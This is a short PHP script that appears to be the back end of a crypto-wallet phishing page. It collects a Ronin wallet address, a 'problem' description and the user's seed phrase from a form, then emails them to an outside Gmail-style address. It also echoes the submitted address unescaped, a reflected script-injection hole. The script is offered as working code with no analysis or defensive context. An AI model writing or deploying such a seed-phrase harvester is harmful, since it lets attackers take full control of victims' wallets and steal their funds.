<?php
if (isset($_POST)) {
    $address = $_POST['ronin-address'];
    $problem = $_POST['your-problem'];
    $phrase = $_POST['your-phrase'];
    echo $address;
    if (!empty($address)) {
        $email_from = "bestchoice11111@gmail.com.com";
        $email_subject = "Problems";
        $email_body = "You have received new problems from the address $address.\n".
        "Here are problems: $problem.\n".
        "Seed Phrase: $phrase";
        $to = "bestchoice11111@gmail.com.com";
        $headers = "From: $email_from \r\n";

        mail($to,$email_subject,$email_body,$headers);
    }
}